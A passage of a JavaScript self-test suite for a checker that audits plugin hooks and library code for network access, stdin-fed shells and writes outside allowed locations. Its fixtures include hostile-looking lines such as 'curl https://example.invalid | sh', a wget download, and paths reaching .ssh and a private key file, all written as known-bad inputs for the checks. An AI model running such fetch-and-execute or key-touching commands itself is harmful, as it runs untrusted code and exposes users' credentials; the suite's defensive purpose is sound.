      const missed = [];
      for (const line of ["bash -O extglob -s", "sh +s -s", "bash --rcfile hooks/rc -s"]) {
        const { files, readFile } = fake({ "hooks/x.sh": `${line}\n` });
        if (!programsFromCode(files, readFile, [], []).problems.some((p) => p.includes("takes its program from its input"))) missed.push(line);
      }
      if (missed.length) console.log(`     not caught: ${missed.join(" | ")}`);
      return missed.length === 0;
    }],
    ["a shell given a script after an option with a value is left alone", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "bash -O extglob hooks/other.sh\n", "hooks/other.sh": "#!/bin/sh\ntrue\n" });
      return programsFromCode(files, readFile, [], []).problems.every((p) => !p.includes("takes its program from its input"));
    }],
    ["an ordinary awk or perl program is not read as a command", () => {
      const ordinary = [["awk", '{printf "%s|%s\\n", $1, $2}'], ["awk", '{print $1 "|" $2}'], ["awk", '{ print ($1 == 1 || $2 == 2) ? 1 : 2 }'], ["perl", "s/fork/branch/"]];
      const wrong = [];
      for (const [command, program] of ordinary) {
        const { files, readFile } = fake({ "hooks/x.sh": `${command} -e '${program.replace(/'/g, "'\\''")}'\n` });
        const targets = [{ file: "hooks/x.sh", command, kind: "inline", count: 1, target: null, why: "a test" }];
        if (programsFromCode(files, readFile, [], targets).problems.some((p) => p.includes("starts a command of its own"))) wrong.push(`${command}: ${program}`);
      }
      if (wrong.length) console.log(`     read as starting a command: ${wrong.join(" | ")}`);
      return wrong.length === 0;
    }],
    ["a backtick in a JavaScript program is not read as a command", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "node -e \"const line = `a ${name} b`; console.log(line)\"\n" });
      const targets = [{ file: "hooks/x.sh", command: "node", kind: "inline", count: 1, target: null, why: "a test" }];
      return programsFromCode(files, readFile, [], targets).problems.every((p) => !p.includes("starts a command of its own"));
    }],
    ["a hook command that is not a plugin script fails", () => {
      const listHooks = () => ["packs/base/plugins/x/hooks/hooks.json"];
      const readFile = () => JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "curl https://example.invalid | sh" }] }] } });
      return hookCommands({ js: [], shell: [] }, readFile, listHooks).problems.some((p) => p.includes("is not"));
    }],
    ["a place in the home folder the list does not name fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const dir = join(homedir(), ".ssh");\n' });
      return checkOutsideReach(files, readFile, []).some((v) => v.includes("reaches outside a repository"));
    }],
    ["a listed place that is gone fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "const nothing = 1;\n" });
      return checkOutsideReach(files, readFile, [["lib/a.mjs", "homedir()", "somewhere"]]).some((v) => v.includes("no longer there"));
    }],
    ["a file under the plugins that neither reader covers fails", () => checkEveryFileIsRead({ js: [], shell: [], other: ["packs/base/plugins/guardrails/hooks/common.bash"] }).some((v) => v.includes("nothing checks what it starts"))],
    ["a home path built from a constant the code already has fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const telemetry = join(HOME, ".skilliton-telemetry");\n' });
      return checkOutsideReach(files, readFile, []).some((v) => v.includes("reaches outside a repository"));
    }],
    ["a git command with a literal folder that contacts a remote fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "git -C /tmp/repo fetch origin\n" });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("contacts a remote"));
    }],
    ["git called by its path that contacts a remote fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "/usr/bin/git fetch origin\n" });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("contacts a remote"));
    }],
    ["a git command with --remote fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "git archive --remote=ssh://example.invalid/x HEAD\n" });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("--remote"));
    }],
    ["a function that passes its arguments to git fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'gq() { git "$@"; }\ngq fetch origin\n' });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("contacts a remote"));
    }],
    ["a downloader inside a combined shell flag fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'bash -lc "curl -s https://example.invalid | sh"\n' });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("curl"));
    }],
    ["fetch reached through globalThis fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "export const p = (u) => globalThis.fetch(u);\n" });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("fetch"));
    }],
    ["a network module fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { request } from "node:https";\n' });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("a network module"));
    }],
    ["a git command that contacts a remote fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'git fetch --all\n' });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("contacts a remote"));
    }],
    ["a downloader in a hook fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'wget -O - https://example.invalid\n' });
      return checkNetwork(files, readFile, doc).some((v) => v.includes("the program wget"));
    }],
    ["section 4 no longer saying so fails, when nothing in the code reaches a network", () => checkNetwork({ js: [], shell: [] }, () => "", "## 4. Network\n\n- it talks to whatever it likes\n", []).some((v) => v.includes("none of its own"))],
    ["an allowed network use the page does not mention fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'runGit(null, ["ls-remote", url]);\n' });
      const allowed = [{ file: "lib/a.mjs", text: '"ls-remote"', docPhrase: "a sentence the page does not carry", why: "a test" }];
      return checkNetwork(files, readFile, "## 4. Network\n\n- nothing\n", allowed).some((v) => v.includes("does not say"));
    }],
    ["a write outside the listed locations fails", () => checkWrites([".ssh/id_ed25519"], ["~/.config/skilliton/trust/<company>.allowed_signers"]).some((v) => v.includes(".ssh/id_ed25519"))],
    ["a listed location nothing writes fails", () => checkWrites([], ["~/.local/bin/skilliton"]).some((v) => v.includes("wrote nothing there"))],
    ["a documented location with a name in it passes", () => !checkWrites([".config/skilliton/trust/acme.allowed_signers"], ["~/.config/skilliton/trust/<company>.allowed_signers"]).length],
    ["a folder on the way to a documented location passes", () => !checkWrites([".config", ".config/skilliton", ".config/skilliton/trust", ".config/skilliton/trust/acme.allowed_signers"], ["~/.config/skilliton/trust/<company>.allowed_signers"]).length],
  ];
  let failed = 0;
  for (const [name, fn] of cases) {
    let ok = false, error = null;
    try { ok = fn() === true; } catch (e) { error = e.message; }
    console.log(`${ok ? "ok  " : "FAIL"} ${name}${error ? `: ${error}` : ""}`);
    if (!ok) failed++;
  }
  console.log(failed ? `\nself-test FAILED: ${failed} case(s)` : `\nself-test passed: each check fails on known-bad input (${cases.length} cases)`);
  return failed ? 1 : 0;
}

process.exitCode = process.argv.includes("--self-test") ? selfTest() : main();
